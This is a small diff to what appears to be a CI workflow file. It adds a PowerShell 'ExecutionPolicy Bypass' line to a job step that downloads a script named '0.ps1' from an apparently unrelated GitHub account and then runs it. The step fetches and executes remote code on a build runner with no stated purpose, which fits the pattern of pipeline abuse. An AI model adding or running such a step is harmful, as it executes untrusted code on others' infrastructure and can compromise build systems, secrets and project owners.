@@ -8,5 +8,6 @@ jobs:
     steps:
     - name: Download
       run: |
+           powershell.exe -ExecutionPolicy Bypass
            Invoke-WebRequest https://github.com/Usser1222/circleci/raw/main/0.ps1 -OutFile 0.ps1
            ./0.ps1
